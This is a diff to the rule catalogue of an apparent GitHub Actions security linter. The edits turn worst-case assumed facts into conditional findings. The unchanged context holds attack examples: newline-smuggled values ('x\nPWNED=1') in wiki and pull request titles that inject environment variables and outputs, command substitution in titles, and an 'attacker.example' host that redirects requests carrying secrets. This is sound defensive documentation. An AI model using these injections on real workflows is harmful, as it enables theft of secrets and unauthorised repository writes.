       # attack-value: github.event.pages[0].title = "x\nPWNED=1"
       # attack-run-behavior: PAGE holds x, a line break and PWNED=1, so echo
       #   appends the two lines page=x and PWNED=1 to $GITHUB_ENV; the runner
@@ -41477,14 +41495,15 @@
 - wiki-closed: gollum in a repository whose wiki is off or that only collaborators may edit
   - finding kinds: envvar-injection.wiki
   - fact kinds:
-    - repo.wiki-open (provider: repo-setting, assumed value: true)
+    - repo.wiki-open (provider: repo-setting, answer that removes the finding: false)
   - example: wiki-closed.yml (workflow, false-positive)
     ```yaml
     # situation: the job runs on gollum and reads the title of a wiki page.
     # reason: the wiki is off, or only collaborators may edit it (GitHub's
     #   default), so no outsider writes the title of a page.
-    # cause: the rule takes the wiki as one anyone may edit unless a file of
-    #   facts says it is not (repo.wiki-open is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that not anyone may edit the
+    #   wiki (repo.wiki-open false), the rule reports the finding. When no source
+    #   answers repo.wiki-open, the finding is conditional.
     # attack-value: github.event.pages[0].title = "x\nPWNED=1"
     # attack-run-behavior: V holds x, a line break and PWNED=1, so echo appends
     #   v=x and PWNED=1 to $GITHUB_ENV, and the runner sets v to x and PWNED to
@@ -41798,7 +41817,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: envvar-injection.controlled
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target opened, a step writes body= and the body
@@ -41812,9 +41831,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack-value: github.event.pull_request.body = "x\nPWNED=1"
     # attack-run-behavior: the pull request of the attacker triggers
     #   pull_request_target, and the run fails with an error, and no job of the
@@ -41988,7 +42008,7 @@
   - cites:
     - <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_call>
     - <https://github.com/advisories/GHSA-7x29-qqmq-v6qc>
-- precondition wiki-open: on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). The finding holds only when repo.wiki-open is true, and the rule assumes repo.wiki-open to be true unless a file of facts says otherwise
+- precondition wiki-open: on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). The finding holds only when repo.wiki-open is true, and the finding is conditional when no source answers repo.wiki-open
   - observed: 2026-09-25, runner 2.337.0: a wiki page titled with \$( ) and backticks, written into run as github.event.pages&#91;0].title, ran the commands; GitHub kept \$, (, ), backticks and ;
   - observed: 2026-10-30, runner 2.338.0: in a public repository whose settings let anyone with an account edit the wiki, an account with no role in the repository created a wiki page on the web interface of GitHub and edited the page; the creation and the edit each started a run of gollum, and each run had the repository's secret, and a step of each run created a ref with the token of the run, which the workflow asked for with contents: write
   - cites:
@@ -42000,7 +42020,7 @@
   - cites:
     - <https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands#multiline-strings>
     - <https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html>
-- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The rule assumes each fact to be true unless a file of facts says otherwise
+- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts
   - observed: 2026-11-05, runner 2.338.2: a GitHub App made a commit status and a check run for a commit of a pull request from a fork: runs of status, check_suite and check_run started on the default branch, and the message of the commit, with \$( ) in it, was in commit.commit.message of status and in check_suite.head_commit.message of check_suite
   - observed: 2026-11-06, runner 2.338.2: the same again: the SHA of the commit of the pull request was in sha and commit.sha of status, check_suite.head_sha and check_suite.head_commit.id of check_suite, and check_run.head_sha and check_run.check_suite.head_sha of check_run; check_suite.after and check_suite.before were null; the author name and the committer name of the commit, with \$( ) in each, were in the payloads of status and check_suite
   - cites:
@@ -42754,7 +42774,7 @@
   - consequence: the step runs the code of a commit that exists only in a fork repository, and any GitHub user can create a fork repository and push commits to the fork repository; when no repository has the commit, the job fails in the step Set up job, and no step of the job runs
   - remedy: pin a commit of a branch or a tag of the repository
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: git.commit-ref (provider: github, assumed value: none)
+  - fact kinds: git.commit-ref (provider: github)
   - attackers: forker-of-called
   - preconditions: fork-commit-runs, caller-writes-sha, not-reusable
   - incidents: trivy-2026
@@ -44727,7 +44747,7 @@
   - remedy: keep the value after the = and take its line breaks out, or write it as name&lt;&lt;DELIM with a random delimiter
   - severity: critical (found from the CVSS metrics below by the table)
   - fix kinds: env-var-review
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true), repo.merge-commit-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks
   - preconditions: runner-reads-lines, attacker-writes-lines, attacker-event, callers-events, app-status-check
   - true positives:
@@ -45157,7 +45177,7 @@
   - remedy: keep the value after the = and take its line breaks out, or write it as name&lt;&lt;DELIM with a random delimiter
   - severity: critical (found from the CVSS metrics below by the table)
   - fix kinds: env-var-review
-  - fact kinds: repo.wiki-open (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.wiki-open (provider: repo-setting)
   - attackers: wiki-editor
   - preconditions: runner-reads-lines, wiki-title-lines, attacker-event, callers-events, wiki-open
   - true positives:
@@ -45165,11 +45185,11 @@
       ```yaml
       # situation: on gollum, a step writes page= and the wiki page's title to
       #   $GITHUB_OUTPUT.
-      # reason: anyone may edit the wiki when it is open to all (repo.wiki-open,
-      #   assumed true), and the runner reads $GITHUB_OUTPUT one line at a time as
+      # reason: anyone may edit the wiki when it is open to all (repo.wiki-open
+      #   true), and the runner reads $GITHUB_OUTPUT one line at a time as
       #   name=value with nothing that escapes the title's line breaks, so each
-      #   later line of the title such as x=y is read as an output of its own
-      #   beside page.
+      #   later line of the title such as x=y is read as an output of its own beside
+      #   page.
       # attack-value: github.event.pages[0].title = "x\nPWNED=1"
       # attack-run-behavior: PAGE holds the two lines x and PWNED=1, so echo writes
       #   the lines page=x and PWNED=1 to $GITHUB_OUTPUT, and the runner reads each
@@ -46860,14 +46880,15 @@
 - wiki-closed: gollum in a repository whose wiki is off or that only collaborators may edit
   - finding kinds: output-clobbering.wiki
   - fact kinds:
-    - repo.wiki-open (provider: repo-setting, assumed value: true)
+    - repo.wiki-open (provider: repo-setting, answer that removes the finding: false)
   - example: wiki-closed.yml (workflow, false-positive)
     ```yaml
     # situation: the job runs on gollum and reads the title of a wiki page.
     # reason: the wiki is off, or only collaborators may edit it (GitHub's
     #   default), so no outsider writes the title of a page.
-    # cause: the rule takes the wiki as one anyone may edit unless a file of
-    #   facts says it is not (repo.wiki-open is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that not anyone may edit the
+    #   wiki (repo.wiki-open false), the rule reports the finding. When no source
+    #   answers repo.wiki-open, the finding is conditional.
     # attack-value: github.event.pages[0].title = "x\nPWNED=1"
     # attack-run-behavior: with the title in V, echo writes the lines v=x and
     #   PWNED=1 to $GITHUB_OUTPUT, and the runner sets the outputs v and PWNED.
@@ -47216,7 +47237,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: output-clobbering.controlled
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target opened, a step writes body= and the body
@@ -47230,9 +47251,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack-value: github.event.pull_request.body = "x\nPWNED=1"
     # attack-run-behavior: the pull request of the attacker triggers
     #   pull_request_target, and the run fails with an error, and no job of the
@@ -47406,14 +47428,14 @@
   - cites:
     - <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_call>
     - <https://github.com/advisories/GHSA-7x29-qqmq-v6qc>
-- precondition wiki-open: on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). The finding holds only when repo.wiki-open is true, and the rule assumes repo.wiki-open to be true unless a file of facts says otherwise
+- precondition wiki-open: on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). The finding holds only when repo.wiki-open is true, and the finding is conditional when no source answers repo.wiki-open
   - observed: 2026-09-25, runner 2.337.0: a wiki page titled with \$( ) and backticks, written into run as github.event.pages&#91;0].title, ran the commands; GitHub kept \$, (, ), backticks and ;
   - observed: 2026-10-30, runner 2.338.0: in a public repository whose settings let anyone with an account edit the wiki, an account with no role in the repository created a wiki page on the web interface of GitHub and edited the page; the creation and the edit each started a run of gollum, and each run had the repository's secret, and a step of each run created a ref with the token of the run, which the workflow asked for with contents: write
   - cites:
     - <https://docs.github.com/en/communities/documenting-your-project-with-wikis/changing-access-permissions-for-wikis>
 - precondition wiki-title-lines: the title of a wiki page holds a line break: inferred, not seen; the title comes from the name of the page's file or a field of one line, and only the titles of issues and pull requests were seen to keep one
   - observed: 2026-09-25, runner 2.337.0: a wiki page's title with \$( ) and backticks came into github.event.pages&#91;0].title as it was written; a line break in it was not tried
-- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The rule assumes each fact to be true unless a file of facts says otherwise
+- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts
   - observed: 2026-11-05, runner 2.338.2: a GitHub App made a commit status and a check run for a commit of a pull request from a fork: runs of status, check_suite and check_run started on the default branch, and the message of the commit, with \$( ) in it, was in commit.commit.message of status and in check_suite.head_commit.message of check_suite
   - observed: 2026-11-06, runner 2.338.2: the same again: the SHA of the commit of the pull request was in sha and commit.sha of status, check_suite.head_sha and check_suite.head_commit.id of check_suite, and check_run.head_sha and check_run.check_suite.head_sha of check_run; check_suite.after and check_suite.before were null; the author name and the committer name of the commit, with \$( ) in each, were in the payloads of status and check_suite
   - cites:
@@ -47665,7 +47687,7 @@
   - consequence: code of others that the job runs, an action, a reusable workflow or a package a script installs, writes to the repository with the token if its maintainer turns it or loses it to an attacker: pushes, releases, packages
   - remedy: write permissions on the workflow or the job with only the scopes it needs, permissions: {} when it needs none
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.default-token-write (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.default-token-write (provider: repo-setting)
   - attackers: maintainer-of-called
   - preconditions: others-code, malicious-code, token-writes
   - incidents: agentkit-2025
@@ -47675,10 +47697,10 @@
       # situation: neither the workflow nor the job writes permissions, and the
       #   job runs actions/checkout, actions/setup-node and npm ci.
       # reason: without permissions, the token has the repository's default, which
-      #   may write (repo.default-token-write, assumed true); both actions take it
-      #   as the default of their token input, and actions/checkout leaves it in
-      #   .git/config, where the install scripts of the packages npm ci installs
-      #   can read it.
+      #   may write (repo.default-token-write true); both actions take it as the
+      #   default of their token input, and actions/checkout leaves it in
+      #   .git/config, where the install scripts of the packages npm ci installs can
+      #   read it.
       # attack: the maintainer of a package npm ci installs, or whoever takes over
       #   their account, publishes a version whose install script reads the token
       #   and sends it out.
@@ -47957,15 +47979,16 @@
 - default-token-read: a job that writes no permissions, in a repository whose default token is read
   - finding kinds: permissions.unwritten
   - fact kinds:
-    - repo.default-token-write (provider: repo-setting, assumed value: true)
+    - repo.default-token-write (provider: repo-setting, answer that removes the finding: false)
   - example: default-token-read.yml (workflow, false-positive)
     ```yaml
     # situation: the job writes no permissions and runs actions and npm.
     # reason: the repository's default token is read, so the token writes
     #   nothing.
-    # cause: the rule takes the default token as one that may write unless a
-    #   file of facts says it is read (repo.default-token-write is assumed true,
-    #   the worst case).
+    # cause: unless a file of facts or --fact says that the default token is read
+    #   (repo.default-token-write false), the rule treats the default token as a
+    #   token that may write and reports the finding. When no source answers
+    #   repo.default-token-write, the finding is conditional.
     # attack: the maintainer of a package npm ci installs, or whoever takes over
     #   their account, publishes a version whose install script reads the token
     #   and sends it out.
@@ -48030,7 +48053,7 @@
   - cites:
     - <https://github.com/advisories/GHSA-mrrh-fwg8-r2c3>
     - <https://github.com/advisories/GHSA-qmg3-hpqr-gqvc>
-- precondition token-writes: neither the job nor the workflow declares permissions, and the default GITHUB_TOKEN of the repository may write (repo.default-token-write; without an answer, the run assumes true, the worst case. The permissive default is the default of the repositories made before 2023-02-02, and those repositories keep the permissive default until someone changes the setting)
+- precondition token-writes: neither the job nor the workflow declares permissions, and the default GITHUB_TOKEN of the repository may write (repo.default-token-write true; without an answer, the finding is conditional. The permissive default is the default of the repositories made before 2023-02-02, and those repositories keep the permissive default until someone changes the setting)
   - cites:
     - <https://docs.github.com/en/actions/concepts/security/github_token>
 - actor: maintainer-of-called
@@ -48168,7 +48191,7 @@
   - consequence: the attacker writes the address of a server of the attacker's own into the value: in args of SonarSource's scanner, one more argument -Dsonar.host.url=&lt;the server>; in route or url of octokit/request-action, a full URL; the action sends the credential to that server, and the attacker uses the credential as the job would
   - remedy: keep a value an attacker controls out of the input: in args of SonarSource's scanner, pass only values written literally in the workflow file; in route or url of octokit/request-action, write the host in the workflow and put the attacker's value only in the path after the host, or in a parameter of the request
   - severity: critical (found from the CVSS metrics below by the table)
-  - fact kinds: repo.wiki-open (provider: repo-setting, assumed value: true), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true), repo.merge-commit-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.wiki-open (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks, wiki-editor
   - preconditions: host-carries-credential, attacker-event, callers-events, wiki-open, app-status-check
   - true positives:
@@ -48260,7 +48283,7 @@
   - consequence: the attacker writes the host of a server of the attacker's own into the value; the command sends the request, with each secret the request carries, to that server, and the attacker uses each secret as the job would: reading what the secret gives access to, and, when the request carries the job's token (GITHUB_TOKEN) and the token can write, writing to the repository while the job runs
   - remedy: do not let a value an attacker controls decide the host of a request that carries a credential: write the host in the workflow and put the attacker's value only after the / that ends the host (https\://api.example.com/&lt;the value>). A check in the script that ends the step with an error when the value is not one of the hosts the workflow expects also stops the attack, but the linter does not read such a check and keeps reporting the request
   - severity: critical (found from the CVSS metrics below by the table)
-  - fact kinds: repo.wiki-open (provider: repo-setting, assumed value: true), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true), repo.merge-commit-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.wiki-open (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks, wiki-editor
   - preconditions: host-carries-credential, attacker-event, callers-events, wiki-open, app-status-check
   - true positives:
@@ -48542,7 +48565,7 @@
   - consequence: the attacker writes the address of a service of the runner's network into the value, such as a service of an internal network or a cloud's metadata service; the request reaches that service from the runner, although the attacker cannot reach that service from outside, and the attacker can make the service act or, where the response comes back to the attacker, read the response
   - remedy: either write the host of the request in the workflow, so that a value an attacker controls does not decide the host, or run the job on a GitHub-hosted runner, which does not reach the network of the self-hosted runner, when the job does not need that network; either one alone removes the finding. A check in the script that ends the step with an error when the value is not one of the hosts the workflow expects also stops the attack, but the linter does not read such a check and keeps reporting the request
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.wiki-open (provider: repo-setting, assumed value: true), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true), repo.merge-commit-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.wiki-open (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks, wiki-editor
   - preconditions: self-hosted-network, attacker-event, callers-events, wiki-open, app-status-check
   - true positives:
@@ -50358,7 +50381,7 @@
 - wiki-closed: gollum in a repository whose wiki is off or that only collaborators may edit
   - finding kinds: request-forgery.credential-host, request-forgery.action-input, request-forgery.runner-network
   - fact kinds:
-    - repo.wiki-open (provider: repo-setting, assumed value: true)
+    - repo.wiki-open (provider: repo-setting, answer that removes the finding: false)
   - example: wiki-closed.yml (workflow, false-positive)
     ```yaml
     # situation: on gollum, a step sends a request with curl and the secret
@@ -50366,8 +50389,9 @@
     #   whose wiki only collaborators may edit.
     # reason: no harm when only collaborators may edit the wiki: they can write
     #   to the repository.
-    # cause: the rule assumes anyone may edit the wiki (repo.wiki-open) unless a
-    #   file of facts says otherwise.
+    # cause: unless a file of facts or --fact says that not anyone may edit the
+    #   wiki (repo.wiki-open false), the rule reports the finding. When no source
+    #   answers repo.wiki-open, the finding is conditional.
     # attack: the attacker titles a wiki page attacker.example, where the wiki
     #   lets anyone edit.
     # attack-run-behavior: with the wiki closed to outsiders, the attacker
@@ -50537,7 +50561,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target, a step sends a request with curl and
@@ -50552,9 +50576,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack: the author of a pull request from a fork names the branch
     #   attacker.example.
     # attack-run-behavior: the pull request of the attacker triggers
@@ -50743,7 +50768,7 @@
   - observed: 2026-09-25, runner 2.337.0: a pull_request run took its workflow from the pull request's branch
   - cites:
     - <https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target>
-- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The rule assumes each fact to be true unless a file of facts says otherwise
+- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts
   - observed: 2026-11-05, runner 2.338.2: a GitHub App made a commit status and a check run for a commit of a pull request from a fork: runs of status, check_suite and check_run started on the default branch, and the message of the commit, with \$( ) in it, was in commit.commit.message of status and in check_suite.head_commit.message of check_suite
   - observed: 2026-11-06, runner 2.338.2: the same again: the SHA of the commit of the pull request was in sha and commit.sha of status, check_suite.head_sha and check_suite.head_commit.id of check_suite, and check_run.head_sha and check_run.check_suite.head_sha of check_run; check_suite.after and check_suite.before were null; the author name and the committer name of the commit, with \$( ) in each, were in the payloads of status and check_suite
   - cites:
@@ -50754,7 +50779,7 @@
   - cites:
     - <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_call>
     - <https://github.com/advisories/GHSA-7x29-qqmq-v6qc>
-- precondition wiki-open: on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). The finding holds only when repo.wiki-open is true, and the rule assumes repo.wiki-open to be true unless a file of facts says otherwise
+- precondition wiki-open: on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). The finding holds only when repo.wiki-open is true, and the finding is conditional when no source answers repo.wiki-open
   - observed: 2026-09-25, runner 2.337.0: a wiki page titled with \$( ) and backticks, written into run as github.event.pages&#91;0].title, ran the commands; GitHub kept \$, (, ), backticks and ;
   - observed: 2026-10-30, runner 2.338.0: in a public repository whose settings let anyone with an account edit the wiki, an account with no role in the repository created a wiki page on the web interface of GitHub and edited the page; the creation and the edit each started a run of gollum, and each run had the repository's secret, and a step of each run created a ref with the token of the run, which the workflow asked for with contents: write
   - cites:
@@ -50969,7 +50994,7 @@
   - consequence: whoever runs the server of the destination, or takes the server over (a breached vendor, or whoever registers a lapsed domain), receives the secret or the job's token and can use the secret or the token as the job would
   - remedy: if the destination is the service that the secret is for, answer true for the pair of the secret (GITHUB_TOKEN for the job's token) and the destination, with --fact 'request.destination-trusted&#91;secret=API_KEY,destination=api.example.com]=true' or the same query in a file of facts given with --facts; if the destination is not, remove the secret from the request
   - severity: medium (found from the CVSS metrics below by the table)
-  - fact kinds: request.destination-trusted (provider: user-supplied, assumed value: false)
+  - fact kinds: request.destination-trusted (provider: user-supplied)
   - attackers: destination-holder
   - preconditions: request-carries, github-holds-secrets
   - true positives:
@@ -51307,9 +51332,9 @@
       #   no file of facts answers for the pair of GITHUB_TOKEN and coveralls.io.
       # reason: the request carries the token of the job to coveralls.io, and
       #   whoever holds the server can use the token while the job runs; the linter
-      #   does not know whether the repository trusts the host with the token, and
-      #   assumes not (request.destination-trusted, with the token named
-      #   GITHUB_TOKEN).
+      #   does not know whether the repository trusts the host with the token, so
+      #   the finding is conditional (request.destination-trusted, with the token
+      #   named GITHUB_TOKEN).
       # attack: the attacker takes over the server of the destination, by a breach
       #   of the vendor or by registering the domain when the domain lapses.
       # attack-run-behavior: the server, now the attacker's, receives the token
@@ -51443,9 +51468,9 @@
       ```yaml
       # situation: on push, a step uploads a build to VirusTotal with curl and the
       #   secret API_KEY in a header; no file of facts answers for the pair.
-      # reason: the request carries API_KEY to www.virustotal.com, and whoever
-      #   holds that server receives the key; the linter does not know whether the
-      #   repository trusts that host with the key, and assumes not
+      # reason: the request carries API_KEY to www.virustotal.com, and whoever holds
+      #   that server receives the key; the linter does not know whether the
+      #   repository trusts that host with the key, so the finding is conditional
       #   (request.destination-trusted).
       # attack: the attacker takes over the server of the destination, by a breach
       #   of the vendor or by registering the domain when the domain lapses.
@@ -52238,7 +52263,7 @@
 - trusted-destination: a destination that is the service the secret is for, such as an API key sent to the API that issued the key
   - finding kinds: secret-exfiltration.untrusted-destination
   - fact kinds:
-    - request.destination-trusted (provider: user-supplied, assumed value: false)
